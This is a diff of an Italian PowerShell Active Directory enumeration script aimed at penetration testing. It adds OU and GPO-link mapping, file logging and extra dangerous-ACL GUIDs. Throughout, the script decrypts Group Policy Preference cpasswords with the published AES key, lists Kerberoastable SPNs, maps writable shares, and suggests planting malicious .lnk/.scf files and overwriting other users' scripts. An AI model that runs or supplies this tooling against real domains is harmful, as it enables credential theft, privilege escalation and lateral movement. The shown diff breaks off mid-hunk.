@@ -1,26 +1,52 @@
 # AD-Enum.ps1 - Script di Enumerazione Active Directory Completo
 # Uso: .\AD-Enum.ps1 oppure Import-Module .\AD-Enum.ps1; Invoke-ADEnum
 
-#region Funzioni Helper
+#region Output System
 
+$script:OutputFile = $null
+$script:OutputBuffer = ""
+
+function Write-Both {
+    param(
+        [string]$Text,
+        [string]$Color = "White",
+        [switch]$NoNewline
+    )
+
+    Write-Host $Text -ForegroundColor $Color -NoNewline:$NoNewline
+
+    if ($script:OutputFile) {
+        if ($NoNewline) {
+            $script:OutputBuffer += $Text
+        } else {
+            $line = $script:OutputBuffer + $Text
+            $script:OutputBuffer = ""
+            Add-Content -Path $script:OutputFile -Value $line
+        }
+    }
+}
+
+#endregion
+
+#region Funzioni Helper
 
 function Write-Banner {
     param([string]$Text)
     $line = "=" * 70
-    Write-Host "`n$line" -ForegroundColor Cyan
-    Write-Host "  $Text" -ForegroundColor Yellow
-    Write-Host "$line`n" -ForegroundColor Cyan
+    Write-Both "`n$line" -Color Cyan
+    Write-Both "  $Text" -Color Yellow
+    Write-Both "$line`n" -Color Cyan
 }
 
 function Write-Section {
     param([string]$Text)
-    Write-Host "`n[+] $Text" -ForegroundColor Green
-    Write-Host ("-" * 50) -ForegroundColor DarkGray
+    Write-Both "`n[+] $Text" -Color Green
+    Write-Both ("-" * 50) -Color DarkGray
 }
 
 function Write-SubSection {
     param([string]$Text)
-    Write-Host "    [*] $Text" -ForegroundColor Cyan
+    Write-Both "    [*] $Text" -Color Cyan
 }
 
 function Write-Finding {
@@ -29,33 +55,35 @@ function Write-Finding {
         [string]$Value,
         [switch]$Important
     )
-    if ($Important) {
-        Write-Host "        $Label : " -ForegroundColor Yellow -NoNewline
-        Write-Host "$Value" -ForegroundColor Red
-    } else {
-        Write-Host "        $Label : " -ForegroundColor Gray -NoNewline
-        Write-Host "$Value" -ForegroundColor White
-    }
+    $color = if ($Important) { "Red" } else { "White" }
+    Write-Both "        $Label : $Value" -Color $color
 }
 
 function Write-Warning {
     param([string]$Text)
-    Write-Host "    [!] $Text" -ForegroundColor Red
+    Write-Both "    [!] $Text" -Color Red
 }
 
 function Write-Info {
     param([string]$Text)
-    Write-Host "    [i] $Text" -ForegroundColor Blue
+    Write-Both "    [i] $Text" -Color Magenta
 }
 
 function LDAPSearch {
     param (
-        [string]$LDAPQuery
+        [string]$LDAPQuery,
+        [string]$SearchBase = $null
     )
     
     $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
-    $DistinguishedName = ([adsi]'').distinguishedName
-    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
+    
+    if ($SearchBase) {
+        $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$SearchBase")
+    } else {
+        $DistinguishedName = ([adsi]'').distinguishedName
+        $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
+    }
+    
     $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
     
     $DirectorySearcher.PageSize = 1000
@@ -175,7 +203,7 @@ function Get-DomainUsers {
                 }
             }
         } else {
-            Write-Host "    [*] $username" -ForegroundColor DarkGray
+            Write-Both "    [*] $username" -Color DarkGray
         }
     }
     
@@ -251,11 +279,17 @@ function Get-DomainGroups {
             $members = $group.Properties.member
             Write-SubSection "$privGroup"
             if ($members) {
-                foreach ($member in $members) {
-                    if ($member -match "CN=([^,]+)") {
-                        $memberName = $matches[1]
-                        Write-Finding "Membro" $memberName -Important
+                foreach ($memberDN in $members) {
+                    # Recupera samaccountname dal DN del membro
+                    $memberObj = LDAPSearch -LDAPQuery "(distinguishedName=$memberDN)"
+                    if ($memberObj -and $memberObj.Properties.samaccountname) {
+                        $memberName = $memberObj.Properties.samaccountname[0]
+                    } elseif ($memberDN -match "CN=([^,]+)") {
+                        $memberName = $matches[1]  # Fallback al CN
+                    } else {
+                        $memberName = $memberDN
                     }
+                    Write-Finding "Membro" $memberName -Important
                 }
             } else {
                 Write-Finding "Membri" "Nessuno"
@@ -289,10 +323,17 @@ function Get-DomainGroups {
             $members = $group.Properties.member
             Write-SubSection "$groupName"
             if ($members) {
-                foreach ($member in $members) {
-                    if ($member -match "CN=([^,]+)") {
-                        Write-Finding "Membro" $matches[1]
+                foreach ($memberDN in $members) {
+                    # Recupera samaccountname dal DN del membro
+                    $memberObj = LDAPSearch -LDAPQuery "(distinguishedName=$memberDN)"
+                    if ($memberObj -and $memberObj.Properties.samaccountname) {
+                        $memberName = $memberObj.Properties.samaccountname[0]
+                    } elseif ($memberDN -match "CN=([^,]+)") {
+                        $memberName = $matches[1]  # Fallback al CN
+                    } else {
+                        $memberName = $memberDN
                     }
+                    Write-Finding "Membro" $memberName
                 }
             }
         }
@@ -364,6 +405,152 @@ function Get-DomainComputers {
     }
 }
 
+function Get-OrganizationalUnits {
+    Write-Banner "ORGANIZATIONAL UNITS"
+    
+    Write-Section "Struttura OU del dominio"
+    
+    $DN = ([adsi]'').distinguishedName
+    $ous = LDAPSearch -LDAPQuery "(objectCategory=organizationalUnit)"
+    
+    # Costruisci struttura gerarchica
+    $ouList = @()
+    
+    foreach ($ou in $ous) {
+        $ouDN = $ou.Properties.distinguishedname[0]
+        $ouName = $ou.Properties.name[0]
+        $ouDesc = $ou.Properties.description[0]
+        $gpLink = $ou.Properties.gplink[0]
+        
+        # Calcola profondità (conta le virgole per determinare il livello)
+        $depth = ($ouDN.ToCharArray() | Where-Object { $_ -eq ',' }).Count
+        $depth = $depth - ($DN.ToCharArray() | Where-Object { $_ -eq ',' }).Count
+        
+        # Conta oggetti nella OU
+        $userCount = 0
+        $computerCount = 0
+        $groupCount = 0
+        
+        try {
+            $usersInOU = LDAPSearch -LDAPQuery "(&(objectCategory=person)(objectClass=user))" -SearchBase $ouDN
+            $userCount = @($usersInOU).Count
+        } catch {}
+        
+        try {
+            $computersInOU = LDAPSearch -LDAPQuery "(objectCategory=computer)" -SearchBase $ouDN
+            $computerCount = @($computersInOU).Count
+        } catch {}
+        
+        try {
+            $groupsInOU = LDAPSearch -LDAPQuery "(objectCategory=group)" -SearchBase $ouDN
+            $groupCount = @($groupsInOU).Count
+        } catch {}
+        
+        # Parse GPO linkate
+        $linkedGPOs = @()
+        if ($gpLink) {
+            $matches = [regex]::Matches($gpLink, '\[LDAP://[cC][nN]=(\{[0-9a-fA-F-]+\}),[^;]+;(\d)\]')
+            foreach ($match in $matches) {
+                $guid = $match.Groups[1].Value
+                $linkedGPOs += $guid
+            }
+        }
+        
+        $ouList += [PSCustomObject]@{
+            Name = $ouName
+            DN = $ouDN
+            Description = $ouDesc
+            Depth = $depth
+            Users = $userCount
+            Computers = $computerCount
+            Groups = $groupCount
+            GPOCount = $linkedGPOs.Count
+            GPOs = $linkedGPOs
+        }
+    }
+    
+    # Ordina per DN per avere struttura gerarchica
+    $ouList = $ouList | Sort-Object -Property DN
+    
+    # Output struttura
+    Write-Section "ALBERO OU ($($ouList.Count) trovate)"
+    
+    foreach ($ou in $ouList) {
+        $indent = "    " * $ou.Depth
+        $stats = "U:$($ou.Users) C:$($ou.Computers) G:$($ou.Groups)"
+        $gpoInfo = if ($ou.GPOCount -gt 0) { " [GPO:$($ou.GPOCount)]" } else { "" }
+        
+        # Evidenzia OU interessanti
+        $color = "White"
+        if ($ou.Name -match 'Admin|Privileged|Tier|PAW|Service|Server|Domain Controller') {
+            $color = "Red"
+        } elseif ($ou.Name -match 'Workstation|Desktop|Client|User') {
+            $color = "Yellow"
+        } elseif ($ou.Name -match 'Disabled|Inactive|Old') {
+            $color = "DarkGray"
+        }
+        
+        Write-Both "$indent[OU] $($ou.Name) ($stats)$gpoInfo" -Color $color
+    }
+    
+    # OU interessanti per pentest
+    Write-Section "OU INTERESSANTI PER PENTEST"
+    
+    $interestingPatterns = @(
+        @{ Pattern = 'Admin|Privileged|Tier0|Tier1|PAW'; Reason = "Account privilegiati" },
+        @{ Pattern = 'Service|SVC|Svc'; Reason = "Service accounts (spesso Kerberoastable)" },
+        @{ Pattern = 'Server|Servers'; Reason = "Server - target per lateral movement" },
+        @{ Pattern = 'Workstation|Desktop|Client'; Reason = "Workstation utenti" },
+        @{ Pattern = 'Disabled|Inactive|Old|Archive'; Reason = "Account disabilitati (potrebbero essere riattivabili)" },
+        @{ Pattern = 'Test|Dev|Lab'; Reason = "Ambienti test (spesso meno protetti)" },
+        @{ Pattern = 'Vendor|External|Contractor'; Reason = "Account esterni" }
+    )
+    
+    foreach ($pattern in $interestingPatterns) {
+        $matchingOUs = $ouList | Where-Object { $_.Name -match $pattern.Pattern }
+        
+        if ($matchingOUs.Count -gt 0) {
+            Write-SubSection "$($pattern.Reason)"
+            foreach ($ou in $matchingOUs) {
+                Write-Finding $ou.Name "U:$($ou.Users) C:$($ou.Computers) G:$($ou.Groups)"
+            }
+        }
+    }
+    
+    # OU con più oggetti
+    Write-Section "OU CON PIÙ OGGETTI"
+    
+    Write-SubSection "Top 5 per Utenti"
+    $topUsers = $ouList | Sort-Object -Property Users -Descending | Select-Object -First 5
+    foreach ($ou in $topUsers) {
+        if ($ou.Users -gt 0) {
+            Write-Finding $ou.Name "$($ou.Users) utenti"
+        }
+    }
+    
+    Write-SubSection "Top 5 per Computer"
+    $topComputers = $ouList | Sort-Object -Property Computers -Descending | Select-Object -First 5
+    foreach ($ou in $topComputers) {
+        if ($ou.Computers -gt 0) {
+            Write-Finding $ou.Name "$($ou.Computers) computer"
+        }
+    }
+    
+    # OU con GPO (potenziali target per GPO abuse)
+    Write-Section "OU CON GPO LINKATE"
+    $ousWithGPO = $ouList | Where-Object { $_.GPOCount -gt 0 } | Sort-Object -Property GPOCount -Descending
+    
+    foreach ($ou in $ousWithGPO) {
+        Write-SubSection "$($ou.Name) ($($ou.GPOCount) GPO)"
+        Write-Finding "DN" $ou.DN
+        Write-Finding "Oggetti" "U:$($ou.Users) C:$($ou.Computers) G:$($ou.Groups)"
+    }
+    
+    if ($ousWithGPO.Count -eq 0) {
+        Write-Info "Nessuna OU con GPO linkate direttamente"
+    }
+}
+
 function Get-SPNs {
     Write-Banner "SERVICE PRINCIPAL NAMES (Kerberoastable)"
     
@@ -387,7 +574,7 @@ function Get-SPNs {
         foreach ($spn in $spns) {
             Write-Finding "SPN" $spn -Important
         }
-        Write-Host ""
+        Write-Both ""
     }
     
     if (-not $found) {
@@ -416,7 +603,7 @@ function Get-PasswordPolicy {
         $netAccounts = net accounts /domain 2>&1
         foreach ($line in $netAccounts) {
             if ($line -match ":") {
-                Write-Host "        $line" -ForegroundColor White
+                Write-Both "        $line" -Color White
             }
         }
     }
@@ -446,7 +633,7 @@ function Get-GPOs {
             Write-Finding "Path" $path
             $gpoCount++
         }
-        Write-Host ""
+        Write-Both ""
         Write-Info "Totale GPO trovate: $gpoCount"
     }
     catch {
@@ -618,7 +805,7 @@ function Get-GPOs {
             }
             Write-Finding "CPassword" $gpp.CPassword
             Write-Finding "Password decrittata" $gpp.DecryptedPassword -Important
-            Write-Host ""
+            Write-Both ""
         }
     }
     
@@ -636,14 +823,13 @@ function Get-GPOs {
             
             $uniqueFindings = $group.Group | Select-Object -Property Pattern, Line -Unique | Select-Object -First 5
             foreach ($finding in $uniqueFindings) {
-                Write-Host "        [$($finding.Pattern)] " -ForegroundColor Yellow -NoNewline
-                Write-Host "$($finding.Line)" -ForegroundColor White
+                Write-Both "        [$($finding.Pattern)] $($finding.Line)" -Color White
             }
-            
+
             if ($group.Group.Count -gt 5) {
-                Write-Host "        ... e altre $($group.Group.Count - 5) occorrenze" -ForegroundColor DarkGray
+                Write-Both "        ... e altre $($group.Group.Count - 5) occorrenze" -Color DarkGray
             }
-            Write-Host ""
+            Write-Both ""
         }
     }
     
@@ -652,18 +838,16 @@ function Get-GPOs {
         Write-Section "Script e file di configurazione ($($scriptsFound.Count) trovati)"
         
         foreach ($script in ($scriptsFound | Select-Object -First 15)) {
-            Write-Host "    [*] " -ForegroundColor Cyan -NoNewline
-            Write-Host "$($script.Name)" -ForegroundColor White -NoNewline
-            Write-Host " ($($script.Size) bytes)" -ForegroundColor DarkGray
-            Write-Host "        $($script.Path)" -ForegroundColor Gray
+            Write-Both "    [*] $($script.Name) ($($script.Size) bytes)" -Color White
+            Write-Both "        $($script.Path)" -Color Gray
         }
         
         if ($scriptsFound.Count -gt 15) {
-            Write-Host ""
+            Write-Both ""
             Write-Info "... e altri $($scriptsFound.Count - 15) file"
         }
         
-        Write-Host ""
+        Write-Both ""
         Write-Info "Controlla manualmente questi file per credenziali hardcoded!"
     }
     
@@ -673,45 +857,246 @@ function Get-GPOs {
         Write-Info "Nessuna credenziale trovata automaticamente in SYSVOL"
     }
     #endregion
-    
-    #region Comandi utili
-    Write-Section "Comandi utili"
-    Write-Host "    # Cerca cpassword in tutti i file" -ForegroundColor Yellow
-    Write-Host "    Get-ChildItem -Path '\\$domainName\SYSVOL' -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'cpassword' -List" -ForegroundColor Gray
-    Write-Host ""
-    Write-Host "    # Cerca password in tutti i file" -ForegroundColor Yellow  
-    Write-Host "    Get-ChildItem -Path '\\$domainName\SYSVOL' -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password' -List" -ForegroundColor Gray
-    Write-Host ""
-    Write-Host "    # Da Kali - decritta GPP password" -ForegroundColor Yellow
-    Write-Host "    gpp-decrypt '<cpassword>'" -ForegroundColor Gray
-    #endregion
 }
 
-# Funzione per decrittare GPP password
+function Get-GPOLinks {
+    Write-Banner "GPO LINKS"
+    
+    Write-Section "Mapping GPO -> Dove sono linkate"
+    Write-Info "Cerca link su: Domain, OU, Sites"
+    Write-Both ""
+    
+    $DN = ([adsi]'').distinguishedName
+    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+    
+    # Dizionario GPO GUID -> Nome
+    $gpoNames = @{}
+    $gpos = LDAPSearch -LDAPQuery "(objectCategory=groupPolicyContainer)"
+    foreach ($gpo in $gpos) {
+        $guid = $gpo.Properties.cn[0]
+        $name = $gpo.Properties.displayname[0]
+        $gpoNames[$guid.ToLower()] = $name
+    }
+    
+    # Trova tutti gli oggetti con gpLink (OU, Domain, Sites)
+    $linkedObjects = @()
+    
+    # Domain root
+    Write-SubSection "Analisi Domain Root..."
+    try {
+        $domainObj = [ADSI]"LDAP://$PDC/$DN"
+        $gpLink = $domainObj.Properties["gpLink"].Value
+        if ($gpLink) {
+            $linkedObjects += [PSCustomObject]@{
+                Target = "DOMAIN: $DN"
+                TargetType = "Domain"
+                GPLink = $gpLink
+                DN = $DN
+            }
+        }
+    } catch {}
+    
+    # Organizational Units
+    Write-SubSection "Analisi Organizational Units..."
+    $ous = LDAPSearch -LDAPQuery "(objectCategory=organizationalUnit)"
+    foreach ($ou in $ous) {
+        $ouDN = $ou.Properties.distinguishedname[0]
+        $ouName = $ou.Properties.name[0]
+        $gpLink = $ou.Properties.gplink[0]
+        
+        if ($gpLink) {
+            $linkedObjects += [PSCustomObject]@{
+                Target = $ouName
+                TargetType = "OU"
+                GPLink = $gpLink
+                DN = $ouDN
+            }
+        }
+    }
+    
+    # Sites (in Configuration partition)
+    Write-SubSection "Analisi Sites..."
+    try {
+        $configDN = "CN=Configuration,$DN"
+        $sites = LDAPSearch -LDAPQuery "(objectClass=site)" -SearchBase "CN=Sites,$configDN"
+        foreach ($site in $sites) {
+            $siteDN = $site.Properties.distinguishedname[0]
+            $siteName = $site.Properties.name[0]
+            $gpLink = $site.Properties.gplink[0]
+            
+            if ($gpLink) {
+                $linkedObjects += [PSCustomObject]@{
+                    Target = $siteName
+                    TargetType = "Site"
+                    GPLink = $gpLink
+                    DN = $siteDN
+                }
+            }
+        }
+    } catch {}
+    
+    # Parse gpLink e mostra risultati
+    # Formato gpLink: [LDAP://cn={GUID},cn=policies,cn=system,DC=...;0][LDAP://...;0]
+    # ;0 = Enabled, ;1 = Disabled, ;2 = Enforced
+    
+    $gpoLinkMap = @{}  # GPO -> Lista di target
+    
+    foreach ($obj in $linkedObjects) {
+        $gpLink = $obj.GPLink
+        
+        # Regex per estrarre GUID delle GPO
+        $matches = [regex]::Matches($gpLink, '\[LDAP://[cC][nN]=(\{[0-9a-fA-F-]+\}),[^;]+;(\d)\]')
+        
+        foreach ($match in $matches) {
+            $guid = $match.Groups[1].Value.ToLower()
+            $linkStatus = $match.Groups[2].Value
+            
+            $statusText = switch ($linkStatus) {
+                "0" { "Enabled" }
+                "1" { "Disabled" }
+                "2" { "Enforced" }
+                default { "Unknown" }
+            }
+            
+            $gpoName = if ($gpoNames[$guid]) { $gpoNames[$guid] } else { $guid }
+            
+            if (-not $gpoLinkMap.ContainsKey($gpoName)) {
+                $gpoLinkMap[$gpoName] = @()
+            }
+            
+            $gpoLinkMap[$gpoName] += [PSCustomObject]@{
+                Target = $obj.Target
+                TargetType = $obj.TargetType
+                TargetDN = $obj.DN
+                Status = $statusText
+            }
+        }
+    }
+    
+    # Output per GPO
+    Write-Section "GPO E RELATIVI LINK"
+
+    foreach ($gpoName in ($gpoLinkMap.Keys | Sort-Object)) {
+        $links = $gpoLinkMap[$gpoName]
+
+        Write-SubSection "$gpoName"
+
+        foreach ($link in $links) {
+            $statusColor = switch ($link.Status) {
+                "Enabled" { "Green" }
+                "Disabled" { "DarkGray" }
+                "Enforced" { "Red" }
+                default { "White" }
+            }
+
+            Write-Both "        [$($link.TargetType)] $($link.Target) [$($link.Status)]" -Color $statusColor
+        }
+
+        # Security Filtering - chi può applicare questa GPO
+        $gpoGuid = ($gpoNames.GetEnumerator() | Where-Object { $_.Value -eq $gpoName } | Select-Object -First 1).Key
+        if ($gpoGuid) {
+            try {
+                $gpoDN = "CN=$gpoGuid,CN=Policies,CN=System,$DN"
+                $gpoEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$gpoDN")
+                $acl = $gpoEntry.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])
+
+                $applyFilters = @{}
+                foreach ($ace in $acl) {
+                    if ($ace.AccessControlType -ne "Allow") { continue }
+                    $principal = $ace.IdentityReference.Value
+
+                    # Salta account di sistema e admin
+                    if ($principal -match "SYSTEM|Domain Admins|Enterprise Admins|Domain Controllers|CREATOR OWNER") { continue }
+
+                    # Cerca permessi che indicano "Apply Group Policy"
+                    if ($ace.ActiveDirectoryRights -match "ExtendedRight|GenericRead|ReadProperty") {
+                        $applyFilters[$principal] = $true
+                    }
+                }
+
+                foreach ($filter in $applyFilters.Keys) {
+                    Write-Both "        [Security Filter] $filter" -Color DarkGray
+                }
+            } catch {}
+        }
+    }
+    
+    # GPO non linkate
+    Write-Section "GPO NON LINKATE"
+    $linkedGPOs = $gpoLinkMap.Keys
+    $unlinkedCount = 0
+    
+    foreach ($gpoGuid in $gpoNames.Keys) {
+        $gpoName = $gpoNames[$gpoGuid]
+        if ($gpoName -notin $linkedGPOs) {
+            Write-Both "    [*] $gpoName" -Color DarkGray
+            $unlinkedCount++
+        }
+    }
+    
+    if ($unlinkedCount -eq 0) {
+        Write-Info "Tutte le GPO sono linkate"
+    }
+    
+    # Riepilogo per OU/Target
+    Write-Section "RIEPILOGO PER TARGET"
+    
+    $byTarget = @{}
+    foreach ($gpoName in $gpoLinkMap.Keys) {
+        foreach ($link in $gpoLinkMap[$gpoName]) {
+            $targetKey = "$($link.TargetType): $($link.Target)"
+            if (-not $byTarget.ContainsKey($targetKey)) {
+                $byTarget[$targetKey] = @()
+            }
+            $byTarget[$targetKey] += [PSCustomObject]@{
+                GPO = $gpoName
+                Status = $link.Status
+            }
+        }
+    }
+    
+    foreach ($target in ($byTarget.Keys | Sort-Object)) {
+        Write-SubSection $target
+        foreach ($gpo in $byTarget[$target]) {
+            $statusColor = if ($gpo.Status -eq "Enforced") { "Red" } elseif ($gpo.Status -eq "Disabled") { "DarkGray" } else { "White" }
+            Write-Both "        -> $($gpo.GPO) [$($gpo.Status)]" -Color $statusColor
+        }
+    }
+}
+
+# Funzione per decrittare GPP password (migliorata con validazione input)
 function Decrypt-GPPPassword {
     param([string]$Cpassword)
     
-    if ([string]::IsNullOrEmpty($Cpassword)) {
-        return ""
+    # Validazione input migliorata
+    if ([string]::IsNullOrWhiteSpace($Cpassword)) {
+        return "[Empty cpassword]"
     }
     
-    # Chiave AES nota (pubblicata da Microsoft)
+    $Cpassword = $Cpassword.Trim()
+    
+    if ($Cpassword.Length -lt 4) {
+        return "[Invalid cpassword - too short]"
+    }
+    
+    # Chiave AES nota (MS14-025)
     $AesKey = [byte[]](0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,
                         0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                         0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,
                         0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
     
     try {
-        # Aggiungi padding se necessario
         $mod = $Cpassword.Length % 4
         if ($mod -ne 0) {
             $Cpassword += '=' * (4 - $mod)
         }
         
-        # Decodifica Base64
         $decoded = [Convert]::FromBase64String($Cpassword)
         
-        # Decripta con AES
+        if ($decoded.Length -eq 0) {
+            return "[Invalid cpassword - empty after decode]"
+        }
+        
         $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
         $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
         $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
@@ -722,11 +1107,18 @@ function Decrypt-GPPPassword {
         
         $decryptor = $aes.CreateDecryptor()
         $decrypted = $decryptor.TransformFinalBlock($decoded, 0, $decoded.Length)
+        $aes.Dispose()
         
         return [System.Text.Encoding]::Unicode.GetString($decrypted)
     }
+    catch [System.FormatException] {
+        return "[Invalid Base64 format]"
+    }
+    catch [System.Security.Cryptography.CryptographicException] {
+        return "[Decryption failed - invalid data]"
+    }
     catch {
-        return "[Errore decrittazione]"
+        return "[Decryption error: $($_.Exception.Message)]"
     }
 }
 
@@ -737,7 +1129,7 @@ function Get-DomainShares {
     
     Write-Section "Ricerca Share e verifica accesso"
     Write-Info "Utente corrente: $env:USERDOMAIN\$env:USERNAME"
-    Write-Host ""
+    Write-Both ""
     
     # Funzione per enumerare share via WMI (più completa di net view)
     function Get-RemoteShares {
@@ -862,14 +1254,14 @@ function Get-DomainShares {
         }
         
         if (-not $tcpTest.TcpTestSucceeded) {
-            Write-Host "    [*] $name - Non raggiungibile (porta 445)" -ForegroundColor DarkGray
+            Write-Both "    [*] $name - Non raggiungibile (porta 445)" -Color DarkGray
             continue
         }
         
         $shares = Get-RemoteShares -ComputerName $hostname
         
         if ($shares.Count -eq 0) {
-            Write-Host "    [*] $name - Nessuna share trovata o accesso negato" -ForegroundColor DarkGray
+            Write-Both "    [*] $name - Nessuna share trovata o accesso negato" -Color DarkGray
             continue
         }
         
@@ -932,10 +1324,7 @@ function Get-DomainShares {
             if ($shareDesc) { $shareDisplay += " ($shareDesc)" }
             if ($isHidden) { $shareDisplay += " [HIDDEN]" }
             
-            Write-Host "        " -NoNewline
-            Write-Host "$shareDisplay" -ForegroundColor White -NoNewline
-            Write-Host " -> " -NoNewline
-            Write-Host "[$accessText]" -ForegroundColor $accessColor
+            Write-Both "        $shareDisplay -> [$accessText]" -Color $accessColor
         }
     }
     
@@ -947,13 +1336,10 @@ function Get-DomainShares {
             $accessType = if ($share.Write) { "READ/WRITE" } else { "READ" }
             $color = if ($share.Write) { "Green" } else { "Yellow" }
             
-            Write-Host "    " -NoNewline
-            Write-Host "\\$($share.Hostname)\$($share.Share)" -ForegroundColor White -NoNewline
-            Write-Host " -> " -NoNewline
-            Write-Host "[$accessType]" -ForegroundColor $color
-            
+            Write-Both "    \\$($share.Hostname)\$($share.Share) -> [$accessType]" -Color $color
+
             if ($share.Description) {
-                Write-Host "        Descrizione: $($share.Description)" -ForegroundColor DarkGray
+                Write-Both "        Descrizione: $($share.Description)" -Color DarkGray
             }
         }
     }
@@ -965,11 +1351,11 @@ function Get-DomainShares {
             Write-Warning "\\$($share.Hostname)\$($share.Share)"
         }
         
-        Write-Host ""
+        Write-Both ""
         Write-Info "Possibili attacchi su share scrivibili:"
-        Write-Host "        - Pianta file malevoli (.lnk, .scf, .url)" -ForegroundColor White
-        Write-Host "        - Sovrascrivi script eseguiti da altri utenti" -ForegroundColor White
-        Write-Host "        - Cerca file sensibili (password, config, backup)" -ForegroundColor White
+        Write-Both "        - Pianta file malevoli (.lnk, .scf, .url)" -Color White
+        Write-Both "        - Sovrascrivi script eseguiti da altri utenti" -Color White
+        Write-Both "        - Cerca file sensibili (password, config, backup)" -Color White
     }
     
     # Share interessanti da investigare
@@ -984,7 +1370,7 @@ function Get-DomainShares {
         foreach ($share in $interestingShares) {
             Write-Warning "\\$($share.Hostname)\$($share.Share)"
             if ($share.Description) {
-                Write-Host "        Descrizione: $($share.Description)" -ForegroundColor Yellow
+                Write-Both "        Descrizione: $($share.Description)" -Color Yellow
             }
         }
     }
@@ -996,7 +1382,7 @@ function Get-ACLAbuse {
     Write-Section "Ricerca permessi pericolosi su oggetti AD"
     Write-Info "Oggetti: Utenti, Gruppi, Computer, GPO, OU, Domain, AdminSDHolder, CertTemplates"
     Write-Info "Permessi: GenericAll, GenericWrite, WriteOwner, WriteDACL, Self, AllExtendedRight"
-    Write-Host ""
+    Write-Both ""
     
     # Permessi pericolosi da cercare
     $dangerousRights = @(
@@ -1011,21 +1397,33 @@ function Get-ACLAbuse {
     )
 
     $script:dangerousGUIDs = @(
-        '00000000-0000-0000-0000-000000000000',  # All Extended Rights (questo è il vero AllExtendedRights)
+        '00000000-0000-0000-0000-000000000000',  # All Extended Rights
         '00299570-246d-11d0-a768-00aa006e0529',  # User-Force-Change-Password
         '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2',  # DS-Replication-Get-Changes
         '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2',  # DS-Replication-Get-Changes-All
         'ab721a54-1e2f-11d0-9819-00aa0040529b',  # Send-As
-        'ab721a56-1e2f-11d0-9819-00aa0040529b'   # Receive-As
+        'ab721a56-1e2f-11d0-9819-00aa0040529b',  # Receive-As
+        'bf9679c0-0de6-11d0-a285-00aa003049e2',  # Self-Membership (add yourself to groups)
+        '0e10c968-78fb-11d2-90d4-00c04f79dc55',  # Certificate-Enrollment (ESC attacks)
+        'a05b8cc2-17bc-4802-a710-e7c15ab866a2',  # Certificate-AutoEnrollment
+        'ee914b82-0a98-11d1-adbb-00c04fd8d5cd',  # Manage-CA (ESC7)
+        'f0f8ffab-1191-11d0-a060-00aa006c33ed',  # Validated-SPN
+        '89e95b76-444d-4c62-991a-0facbeda640c'   # DS-Replication-Get-Changes-In-Filtered-Set
     )
 
     $script:guidToName = @{
-    '00000000-0000-0000-0000-000000000000' = 'AllExtendedRights'
-    '00299570-246d-11d0-a768-00aa006e0529' = 'User-Force-Change-Password'
-    '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' = 'DS-Replication-Get-Changes'
-    '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' = 'DS-Replication-Get-Changes-All'
-    'ab721a54-1e2f-11d0-9819-00aa0040529b' = 'Send-As'
-    'ab721a56-1e2f-11d0-9819-00aa0040529b' = 'Receive-As'
+        '00000000-0000-0000-0000-000000000000' = 'AllExtendedRights'
+        '00299570-246d-11d0-a768-00aa006e0529' = 'User-Force-Change-Password'
+        '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' = 'DS-Replication-Get-Changes'
+        '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' = 'DS-Replication-Get-Changes-All'
+        'ab721a54-1e2f-11d0-9819-00aa0040529b' = 'Send-As'
+        'ab721a56-1e2f-11d0-9819-00aa0040529b' = 'Receive-As'
+        'bf9679c0-0de6-11d0-a285-00aa003049e2' = 'Self-Membership'
+        '0e10c968-78fb-11d2-90d4-00c04f79dc55' = 'Certificate-Enrollment'
+        'a05b8cc2-17bc-4802-a710-e7c15ab866a2' = 'Certificate-AutoEnrollment'
+        'ee914b82-0a98-11d1-adbb-00c04fd8d5cd' = 'Manage-CA'
+        'f0f8ffab-1191-11d0-a060-00aa006c33ed' = 'Validated-SPN'
+        '89e95b76-444d-4c62-991a-0facbeda640c' = 'DS-Replication-Get-Changes-In-Filtered-Set'
     }
     
     # SID da ignorare (built-in/system accounts)
@@ -1145,7 +1543,7 @@ function Get-ACLAbuse {
         $findings += Get-DangerousACL -ObjectDN $userDN -ObjectName $userName -ObjectType "User"
         $userCount++
     }
-    Write-Host "        Analizzati $userCount utenti" -ForegroundColor DarkGray
+    Write-Both "        Analizzati $userCount utenti" -Color DarkGray
     
     # Enumera gruppi
     Write-SubSection "Analisi ACL su Gruppi..."
@@ -1159,7 +1557,7 @@ function Get-ACLAbuse {
         $findings += Get-DangerousACL -ObjectDN $groupDN -ObjectName $groupName -ObjectType "Group"
         $groupCount++
     }
-    Write-Host "        Analizzati $groupCount gruppi" -ForegroundColor DarkGray
+    Write-Both "        Analizzati $groupCount gruppi" -Color DarkGray
     
     # Enumera computer
     Write-SubSection "Analisi ACL su Computer..."
@@ -1173,7 +1571,7 @@ function Get-ACLAbuse {
         $findings += Get-DangerousACL -ObjectDN $compDN -ObjectName $compName -ObjectType "Computer"
         $compCount++
     }
-    Write-Host "        Analizzati $compCount computer" -ForegroundColor DarkGray
+    Write-Both "        Analizzati $compCount computer" -Color DarkGray
     
     # Enumera GPO
     Write-SubSection "Analisi ACL su Group Policy Objects..."
@@ -1188,7 +1586,7 @@ function Get-ACLAbuse {
